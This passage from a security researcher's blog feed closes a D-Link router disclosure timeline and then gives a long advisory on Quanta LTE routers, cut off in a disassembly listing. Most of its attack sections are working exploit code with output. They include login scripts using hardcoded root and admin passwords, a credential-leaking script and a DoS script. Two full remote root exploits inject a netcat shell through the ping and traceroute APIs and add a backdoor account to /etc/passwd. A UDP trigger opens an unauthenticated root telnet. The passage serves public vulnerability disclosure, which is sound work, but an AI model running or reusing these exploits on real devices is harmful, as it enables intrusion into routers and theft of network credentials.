<li>Jul 09, 2016: Pierre asks for updates.</li>
<li>Jul 09, 2016: Dlink says they will have correction by July 15.</li>
<li>Jul 19, 2016: Pierre asks for updates.</li>
<li>Aug 19, 2016: Pierre asks for updates.</li>
<li>Sep 12, 2016: Pierre asks for updates and says he will soon release an advisory as 90 days have passed without news.</li>
<li>Sep 12, 2016: cert@cert.org is contacted to get pieces of advice about the disclosure.</li>
<li>Sep 13, 2016: CERT recommends to try to contact D-link and to publish the advisory.</li>
<li>Sep 13, 2016: Dlinks says they don't have a schedule for a firmware release. Customers who have questions should contact their local/regional D-Link support offices for the latest information. <a href="http://support.dlink.com">support.dlink.com</a> will be updated in the next 24 hours.</li>
<li>Sep 28, 2016: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<p>I would like to thank <a href="https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli">Gianni Carabelli</a> who found this router and thought it was very similar to the previous backdoored Quanta routers.</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2016-dlink-0x00.txt">https://pierrekim.github.io/advisories/2016-dlink-0x00.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html</a></p>
<p><a href="https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli">https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities found in Quanta LTE routers (backdoor, backdoor accounts, RCE, weak WPS ...)</title>
        <link href="2016-04-04-quanta-lte-routers-vulnerabilities.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Quanta Computer Incorporated is a Taiwan-based manufacturer of electronic hardware.
It is the largest manufacturer of notebook computers in the world.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Quanta LTE QDH Router device is a LTE router / access point overall badly
designed with a lot of vulnerabilities. It's available in a number of countries to
provide Internet with a LTE network.</p>
<p>The tests below are done using the latest available firmware (firmware 01.00.05_1210, model revision QDHY10_M1.2252_45041, /DailyBuild/MDM9x25_2031_QDT/QDHY_2031_YOOMEE/codebase/MDM9x25_2031_QDH_20141210_0940/MDM9x25_2031_QDT/LINUX/apps_proc/oe-core/build/tmp-eglibc/work-shared/gcc-4.6.2+svnr181430-r22/gcc-4_6-branch/libgcc/../gcc/config/arm).</p>
<p>The summary of the vulnerabilities is:</p>
<ul>
<li><a href="#hardcoded-ssh-server-key">Hardcoded SSH Server key</a></li>
<li><a href="#backdoor-accounts">Backdoor accounts</a></li>
<li><a href="#router-dos">Router DoS</a></li>
<li><a href="#webinterface-information-leak">WebInterface Information Leak</a></li>
<li><a href="#rce-1">RCE #1</a></li>
<li><a href="#rce-2">RCE #2</a></li>
<li><a href="#backdoor">Backdoor</a></li>
<li><a href="#default-wps-pin">Default WPS PIN</a></li>
<li><a href="#weak-wps-pin-generation">Weak WPS PIN Generation - with a reverse-engineered algorithm</a></li>
<li><a href="#backdoor-accounts-in-samba">Backdoor accounts in Samba</a></li>
<li><a href="#leaking-no-ip-account">Leaking No-IP account (?)</a></li>
<li><a href="#remote-fota">Remote FOTA (Firmware Over The Air)</a></li>
<li><a href="#toctou-lpe">TOCTOU vulnerability in QCMAP_ConnectionManager - LPE</a></li>
<li><a href="#default-wifi-password-weakness">Default Wifi Password Weakness</a></li>
<li><a href="#http-dos">HTTP DoS</a></li>
<li><a href="#arbitrary-file-browsing-using-the-http-daemon">Arbitrary file browsing using the http daemon</a></li>
<li><a href="#arbitrary-file-reading-using-the-http-daemon">Arbitrary file reading using the http daemon</a></li>
<li><a href="#network-eavesdropping">Network Eavesdropping - Interception with the gglogd program</a></li>
<li><a href="#security-removed-in-upnp">Security removed in UPnP</a></li>
<li><a href="#undocumented-diagnostic-webpage">Undocumented diagnostic webpage</a></li>
<li><a href="#misc">Misc</a></li>
</ul>
<p>A personal point of view: at best, the vulnerabilites are due to incompetence; at worst, it is a deliberate act of security sabotage from the vendor. Not all the vulnerabilities found have been disclosed in this advisory. Only the significant ones are shown.</p>
<p>Note: This firmware is being used by other Quanta CPEs. From the <code>/usr/www/js/ui/qdisplay.js</code> file,
the vulnerable firmware seems to be used in several routers:</p>
<ul>
<li>Quanta 4G WiFi Router QDH</li>
<li>Quanta 4G WiFi Router UNE</li>
<li>Quanta 4G WiFi Router MOBILY (QDH-Mobily - CPE342X)</li>
<li>Quanta 4G WiFi Router Yoomee</li>
</ul>
<p><img src="http://my.ifdesign.de/upload/entry_ex_media/award_277/127936_4516_large_entry_medium.jpg" width=250></p>
<p>The routers are still on sale and used in several countries.</p>
<p>Due to lack of communication of the vendor, the specific list of affected countries is unknown. However, we assume the affected firmware is used at least in some Arabic speaking countries as the Help files are written in English, French, Chinese and Arabic (See <code>http://192.168.1.1/help_ar.html</code>). </p>
<p><strong>Due to lack of security patches provided by the vendor, the vulnerabilities will remain unpatched</strong>.</p>
<p><a id="hardcoded-ssh-server-key"></a></p>
<h2>Details - Hardcoded SSH Server key</h2>
<p>A hardcoded SSH server key can be found in <code>/etc/dropbear/dropbear_rsa_host_key</code> and can be used to decipher SSH traffic to the router:</p>
<pre><code>admin@homerouter:~$ ls -la /etc/dropbear/dropbear_rsa_host_key
-rw-------  1 root  root  427 Dec 10  2014 dropbear/dropbear_rsa_host_key
#
</code></pre>
<p>Base64 hardcoded SSH server key:</p>
<pre><code>user@kali:~$ cat dropbear_rsa_host_key | base64 
AAAAB3NzaC1yc2EAAAADAQABAAAAgwC9P88UlGdb6WIsIcyni8zh4zLdrSORieNeZNXtDHiH
zgs80XQ8FOBBaNBTBAib+GX6V8Aixvmh315+H6xyb4fQSlicpJ1lq4k7pKsrXGgdYS2FTPrX
A8YG+1beVvWeK9/8LjXAdZCzwE7D8jOSPh9dw0HIuPQhBCfxE4o/WOvYwVMZAAAAggHJf9g9
CAZWS3zo80ysPWqvKXBuNYEm9RCTwXDn/p3isFi6Th+Qn2cCuT/lcHrfkz/0Uu5JJHuWt0bX
3/ojKzxIaUQplS1Kumc4qF65ksKWjCmJuKvtO50dooZNEmq86AKKnrC6t+7qb/5koX9eu/dV
4w4P2jETGZBEUOLwFULn9aEAAABCAPUi4oI9NcRHZ3tvlEXgN/7Cd2F/UbshuW0kV1v4sJZj
ABmVrJ5TXol8Ne8KoWinxHfGaSky/IJR9zSkTaUJy115AAAAQgDFouA20kCjNeGgtabxuRP7
lndn8/4jXR0/HvEVdZIki9Z5gifC5+gxn8rKcyTSZZmyMYGwLQsN3Z9LumQT/DdaoQ==
user@kali:~$
</code></pre>
<p><a id="backdoor-accounts"></a></p>
<h2>Details - Backdoor accounts</h2>
<p>By default, telnetd and SSHd are running in the router.</p>
<p>2 backdoors accounts exist and can be used to bypass the HTTP authentication used to manage the router.</p>
<pre><code>admin@homerouter:~$ grep admin /etc/passwd 
admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
admin@homerouter:~$
</code></pre>
<p>The password for admin is 'admin' and can be found in the <code>/bin/appmgr</code> program using IDA:</p>
<p><img alt="" src="images/2016-quanta-backdoor-admin-default-mod_sysadm_config_passwd.png" /></p>
<p>About the root user:</p>
<pre><code>root@homerouter:~# grep root /etc/shadow
root:aRDiHrJ0OkehM:16414:0:99999:7:::
root@homerouter:~#
</code></pre>
<p>Using john to crack the hashes:</p>
<pre><code>user@kali:~$ john -show shadow+passwd
admin:admin:admin:/:/bin/sh
root:1234:16414:0:99999:7:::

2 password hashes cracked, 0 left
user@kali:~$
</code></pre>
<p>Results:</p>
<ul>
<li>admin has password admin</li>
<li>root has password 1234</li>
</ul>
<p>Working exploit for admin:</p>
<pre><code>user@kali:~$ cat quanta-ssh-default-password-admin
#!/usr/bin/expect -f

set timeout 3
spawn ssh admin@192.168.1.1
expect "password: $"
send "admin\r"
interact
user@kali:~$ ./quanta-ssh-default-password-admin
spawn ssh admin@192.168.1.1
admin@192.168.1.1's password:
admin@homerouter:~$ id
uid=168(admin) gid=168(admin) groups=168(admin)
admin@homerouter:~$
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin">https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin</a>.</p>
<p>Working exploit for root</p>
<pre><code>user@kali:~$ cat quanta-ssh-default-password-root
#!/usr/bin/expect -f

set timeout 3
spawn ssh root@192.168.1.1
expect "password: $"
send "1234\r"
interact
user@kali:~$ ./quanta-ssh-default-password-root
spawn ssh root@192.168.1.1
root@192.168.1.1's password:
root@homerouter:~# id
uid=168(root) gid=168(root) groups=168(root)
root@homerouter:~#
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-root">https://pierrekim.github.io/advisories/quanta-ssh-default-password-root</a>.</p>
<p><a id="router-dos"></a></p>
<h2>Details - Router DoS</h2>
<p>The router has apparently small capacity when trying to route packets.</p>
<p>This "exploit" will likely force the router to reboot:</p>
<pre><code>user@kali:~$ cat quanta-dos-crash-router.sh
#!/bin/sh

echo this exploit will crash the router if you are using RJ45
echo press [enter]
read x
nmap -sP -T5 10.201.12.0/24 2&gt;/dev/null &gt;/dev/null

user@kali:~$ ./quanta-dos-crash-router.sh
this exploit will crash the router if you are using RJ45
press [enter]

[the router will reboot]
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-dos-crash-router.sh">https://pierrekim.github.io/advisories/quanta-dos-crash-router.sh</a>.</p>
<p><a id="webinterface-information-leak"></a></p>
<h2>Details - WebInterface Information Leak</h2>
<p>The webinterface allows an attacker to retrieve every sensible information without authentication (web login, web passwords, wifi configuration, WPS PIN, Dyndns login, Dyndns passwords, Wifi SSIDs, ...).</p>
<p>This "exploit" will show all the configuration of the router, including logins and passwords:</p>
<pre><code>user@kali:~$ cat quanta-infoleak.sh
#!/bin/sh

ip=$1
if [ ! $1 ]; then
  echo "$0 ip"
  exit 1
fi

echo "INFOLEAK"
echo "press [enter]"
read wut
for i in system apn firewall fota lan modem portfwd r_sku samba sms10 wan_lte wan_wifi wifi cm netstat ipfilter ddns dlna tr069 ip6filter wizard ; do
  wget -qO- "http://$ip/data.ria?CfgType=get_homeCfg&amp;file=$i"
done
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-infoleak.sh">https://pierrekim.github.io/advisories/quanta-infoleak.sh</a>.</p>
<p>Using this exploit:</p>
<pre><code>user@kali:~$ ./quanta-infoleak.sh 192.168.1.1
INFOLEAK
press [enter]
[META]
System_Log="2,M"
[VER]
config="1.0"
[DEVICE]
web_usrname="admin"
web_passwd="admin"
login_timeout="0"
language="10"
[SNTP]
enable="1"
timezone="16"
update_period="12"
server1="0.africa.pool.ntp.org"
server2="1.africa.pool.ntp.org"
server3="time.windows.com"
[PWRMGR]
batt_idle_tm="0"
deep_sleep_tm="0"
pwroff_idle_tm="0"
[WEBSVC]

[....snip....]
[AP1]
enable="1"
ssid="OperatorWiFi-0000"
channel="0"
ch_width="0"
hidden="0"
security="3"
wpa_auth="5"
wpa_passphrase="test test"
[....snip....]
enrollee_pin="28296607"
[....snip....]
user@kali:~$
</code></pre>
<p><a id="rce-1"></a></p>
<h2>Details - RCE #1</h2>
<p>The Webinterface allows an attacker to execute commands as root by injecting commands.</p>
<p>The first RCE has been found in the ping API:</p>
<p>Ping Remote command execution with <code>nc -l -p 1337 -e /bin/ash</code> as a payload</p>
<pre><code>user@kali:~$ wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"ping\",\"cmd\":\"ping\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"cnt\":4,\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
</code></pre>
<p>A complete exploit is provided and will produce this output:</p>
<pre><code>user@kali:~$ ./quanta-rce-remote-exploit-ping.sh
  Stage [1] - Bypassing authentication ... OK
  local admin             = admin
  local passw             = admin
  wifi access point       = OperatorWiFi-0000
  wifi password           = test
  WPS PIN                 = 28296607
  guest wifi access point = OperatorWiFi-Guest-0000
  guest wifi password     = 12345678
  public ip               = 0.0.0.0
  gateway                 = 0.0.0.0
  subnet mask             = 255.255.255.252
  dns server #1           = 41.242.32.26
  dns server #2           = 41.242.32.42

Stage [2] - RCE ... OK
Stage [3] - Checking the router ... OK
uid=0(root) gid=0(root)
HACK THE PLANET
Stage [4] - Creating a backdoor account ... OK
Stage [5] - Connecting as backdoor/admin to the remote sshd ...

Have fun!

spawn ssh backdoor@192.168.1.1
backdoor@192.168.1.1's password: 
root@homerouter:/# id
uid=0(root) gid=0(root) groups=0(root)
root@homerouter:/#
</code></pre>
<p>This exploit will bypass the authentication, get the information about credentials using the infoleak, use them to get a CSRF token, launch a backdoor shell as root, add an user and then connect with SSH with the new created account with a fully-working shell:</p>
<pre><code>user@kali:~$ cat quanta-rce-remote-exploit-ping.sh
#!/bin/sh

TMP_DIR=$(mktemp -d)

echo -n "Stage [1] - Bypassing authentication ..."

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
wget -qO${TMP_DIR}/stage1-wifi 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=wifi'
wget -qO${TMP_DIR}/stage1-network 'http://192.168.1.1/data.ria?DynUpdate=up_5s'

echo " OK"
echo -n "  local admin             = "
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo $http_login
echo -n "  local passw             = "
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo $http_password
echo -n "  wifi access point       = "
grep ssid ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  wifi password           = "
grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  WPS PIN                 = "
grep enrollee_pin ${TMP_DIR}/stage1-wifi | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  guest wifi access point = "
grep ssid ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  guest wifi password     = "
grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'

echo -n "  public ip               = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep ip | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  gateway                 = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep gateway | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  subnet mask             = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep subnet_mask | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  dns server #1           = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns1 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  dns server #2           = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns2 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'


echo
echo -n "Stage [2] - RCE ..."
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"ping\",\"cmd\":\"ping\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"cnt\":4,\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
echo " OK"
echo "Stage [3] - Checking the router ... OK"
(echo id; echo echo "backdoor:htEcF9TWn./9Q:0:0:backdoor:/:/bin/sh &gt;&gt; /etc/passwd" ; echo echo HACK THE PLANET ; echo exit) | nc 192.168.1.1 1337
echo -n "Stage [4] - Creating a backdoor account ..."
echo " OK"
echo "Stage [5] - Connecting as backdoor/admin to the remote sshd ..."
echo
echo "Have fun!"
echo
expect -c 'set timeout 3; spawn ssh backdoor@192.168.1.1; expect "password: $"; send "admin\r"; interact'
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-ping.sh">https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-ping.sh</a>.</p>
<p><a id="rce-2"></a></p>
<h2>Details - RCE #2</h2>
<p>The Webinterface allows an attacker to execute commands as root by injecting commands.</p>
<p>The second RCE has been found in the traceroute API:</p>
<p>Traceroute Remote command execution:</p>
<pre><code>user@kali:~$ wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"tracert\",\"cmd\":\"tracert\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
</code></pre>
<p>Working exploit:</p>
<p>The output is the same as the first RCE.  A complete exploit is provided and will produce this output:</p>
<pre><code>user@kali:~$ ./quanta-rce-remote-exploit-traceroute.sh
  Stage [1] - Bypassing authentication ... OK
  local admin             = admin
  local passw             = admin
  wifi access point       = OperatorWiFi-0000
  wifi password           = test
  WPS PIN                 = 28296607
  guest wifi access point = OperatorWiFi-Guest-0000
  guest wifi password     = 12345678
  public ip               = 0.0.0.0
  gateway                 = 0.0.0.0
  subnet mask             = 255.255.255.252
  dns server #1           = 41.242.32.26
  dns server #2           = 41.242.32.42

Stage [2] - RCE ... OK
Stage [3] - Checking the router ... OK
uid=0(root) gid=0(root)
HACK THE PLANET
Stage [4] - Creating a backdoor account ... OK
Stage [5] - Connecting as backdoor/admin to the remote sshd ...

Have fun!

spawn ssh backdoor@192.168.1.1
backdoor@192.168.1.1's password:
root@homerouter:/# id
uid=0(root) gid=0(root) groups=0(root)
root@homerouter:/#
</code></pre>
<p>This exploit will bypass the authentication, get the information about credentials using the infoleak, use them to get a CSRF token, launch a backdoor shell as root, add an user and then connect with SSH with the new created account with a fully-working shell:</p>
<pre><code>user@kali:~$ cat quanta-rce-remote-exploit-ping.sh
#!/bin/sh

TMP_DIR=$(mktemp -d)

echo -n "Stage [1] - Bypassing authentication ..."

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
wget -qO${TMP_DIR}/stage1-wifi 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=wifi'
wget -qO${TMP_DIR}/stage1-network 'http://192.168.1.1/data.ria?DynUpdate=up_5s'

echo " OK"
echo -n "  local admin             = "
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo $http_login
echo -n "  local passw             = "
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo $http_password
echo -n "  wifi access point       = "
grep ssid ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  wifi password           = "
grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | head -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  WPS PIN                 = "
grep enrollee_pin ${TMP_DIR}/stage1-wifi | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  guest wifi access point = "
grep ssid ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'
echo -n "  guest wifi password     = "
grep wpa_passphrase= ${TMP_DIR}/stage1-wifi | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }'

echo -n "  public ip               = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep ip | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  gateway                 = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep gateway | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  subnet mask             = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep subnet_mask | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  dns server #1           = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns1 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'
echo -n "  dns server #2           = "
json_xs -t json-pretty &lt; ${TMP_DIR}/stage1-network  | sort | grep dns2 | head -n 2 | tail -n 1 | sed -e 's#"##g;s#,##' | awk '{ print $3 }'


echo
echo -n "Stage [2] - RCE ..."
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
wget -qO/dev/null --header="Cookie: ${http_session}" --post-data="{\"CfgType\":\"tracert\",\"cmd\":\"tracert\",\"url\":\"\`/bin/nc -l -p 1337 -e /bin/ash\`\",\"authID\":\"${http_csrf_token}\"}" "http://192.168.1.1/webpost.cgi"
echo " OK"
echo "Stage [3] - Checking the router ... OK"
(echo id; echo echo "backdoor:htEcF9TWn./9Q:0:0:backdoor:/:/bin/sh &gt;&gt; /etc/passwd" ; echo exit) | nc 192.168.1.1 1337
echo -n "Stage [4] - Creating a backdoor account ..."
echo " OK"
echo "Stage [5] - Connecting as backdoor/admin to the remote sshd ..."
echo
echo "Have fun!"
echo
expect -c 'set timeout 3; spawn ssh backdoor@192.168.1.1; expect "password: $"; send "admin\r"; interact'
</code></pre>
<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-traceroute.sh">https://pierrekim.github.io/advisories/quanta-rce-remote-exploit-traceroute.sh</a>.</p>
<p><a id="backdoor"></a></p>
<h2>Details - Backdoor</h2>
<p>A backdoor is present inside the <code>/bin/appmgr</code> program. By sending a specific string in UDP to the router, an authentication-less telnet server will start if a telnetd daemon is not already running.</p>
<p>In <code>/bin/appmgr</code>, a thread listens to 0.0.0.0:39889 (UDP) and waits for commands.</p>
<p>If a client sends "HELODBG" to the router, the router will execute <code>/sbin/telnetd -l /bin/sh</code>, allowing to access without authentication to the router as root.</p>
<p>When using IDA, we can see the backdoor is located in the main function (line 389):</p>
<p><img alt="" src="images/2016-quanta-backdoor-telnet.png" /></p>
<p>Working PoC :</p>
<pre><code>user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
Hello
^C
user@kali:~$ telnet 192.168.1.1
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.

OpenEmbedded Linux homerouter.cpe


msm 20141210 homerouter.cpe

/ # id
uid=0(root) gid=0(root)
/ # exit
Connection closed by foreign host.
user@kali:~$
</code></pre>
<p><a id="default-wps-pin"></a></p>
<h2>Details - Default WPS PIN</h2>
<p>Wi-Fi Protected Setup(WPS) is a standard for easy and secure establishment of a wireless home network, as defined in the documentation provided in the router (help.html).</p>
<p>By default, the PIN for the WPS system is ever <code>28296607</code>. It is, in fact, hardcoded in the <code>/bin/appmgr</code> program:</p>
<p><img alt="" src="images/2016-quanta-wifi_get_default_wps_pin.png" /></p>
<p>An user can check in the webinterface ("Par defaut" means "By default"):</p>
<p><img alt="" src="images/2016-quanta-backdoor-default-pin-wps-interface.png" /></p>
<p>This PIN can be found in the HostAP configuration too, and, using the information leak, in the HTTP APIs of the router:</p>
<pre><code>root@homerouter:~# ps -a|grep hostap
 1006 root       0:00 hostapd /var/wifi/ar6k0.conf
 1219 root       0:00 grep hostap
root@homerouter:~# cat /var/wifi/ar6k0.conf
[...]
ap_pin=28296607
[...]
</code></pre>
<p>Leak of the default WPS PIN in the HTTP APIs:</p>
<pre><code>user@kali:~$ ./quanta-infoleak.sh 192.168.1.1 | grep pin
enrollee_pin="28296607"
user@kali:~$
</code></pre>
<p><a id="weak-wps-pin-generation"></a></p>
<h2>Details - Weak WPS PIN Generation - with a reverse-engineered algorithm</h2>
<p>An user can use the webinterface to generate a temporary PIN for the WPS system (low probability as the <code>28296607</code> WPS PIN is provided by default).</p>
<p>The PIN generated by the router is weak as it is generated using this "strange" reverse-engineered algorithm:</p>
<pre><code>user@kali:~$ cat quanta-wps-gen.c
</code></pre>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;time.h&gt;</span><span style="color: #BC7A00"></span>

<span style="color: #B00040">int</span> <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
{ 
  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span>  i0, i1;
  <span style="color: #B00040">int</span>           i2;

  <span style="color: #408080; font-style: italic">/* the seed is the current time of the router, which uses NTP... */</span>
  srand(time(<span style="color: #666666">0</span>));

  i0 <span style="color: #666666">=</span> rand() <span style="color: #666666">%</span> <span style="color: #666666">10000000</span>;
  <span style="color: #008000; font-weight: bold">if</span> (i0 <span style="color: #666666">&lt;=</span> <span style="color: #666666">999999</span>)
    i0 <span style="color: #666666">+=</span> <span style="color: #666666">1000000</span>;
  i1 <span style="color: #666666">=</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
  i2 <span style="color: #666666">=</span> (<span style="color: #666666">10</span> <span style="color: #666666">-</span> (i1 <span style="color: #666666">/</span> <span style="color: #666666">10000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">100</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">3</span> <span style="color: #666666">*</span>
       (i1 <span style="color: #666666">/</span> <span style="color: #666666">100000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0 <span style="color: #666666">/</span> <span style="color: #666666">10000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">10</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span>))
        <span style="color: #666666">%</span> <span style="color: #666666">10</span>) <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;

  printf(<span style="color: #BA2121">&quot;%d</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, i2 );

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
}
</pre></div>

<pre><code>user@kali:~$ gcc -o quanta-wps-gen quanta-wps-gen.c
user@kali:~$ ./quanta-wps-gen
97329329
user@kali:~$
</code></pre>
<p>You can fetch this program at <a href="https://pierrekim.github.io/advisories/quanta-wps-gen.c">https://pierrekim.github.io/advisories/quanta-wps-gen.c</a>.</p>
<p>Using <code>srand(time(0))</code> as a seed is a bad idea because an attacker, knowing the current date as <code>time(0)</code> returns the current date in an integer value, can just generate the valid WPS PIN. The Router uses NTP so is likely to have a correct timestamp configured. It's trivial for an attacker to generate valid WPS PIN suites and bruteforce them.</p>
<p>For the curious reader, the original algorithm in the firmware is:</p>
<pre><code>.text:0001B8C8                 EXPORT generate_wlan_wps_enrollee_pin
.text:0001B8C8 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
.text:0001B8C8
.text:0001B8C8 var_3C          = -0x3C
.text:0001B8C8 var_38          = -0x38
.text:0001B8C8 s               = -0x34
.text:0001B8C8 var_30          = -0x30
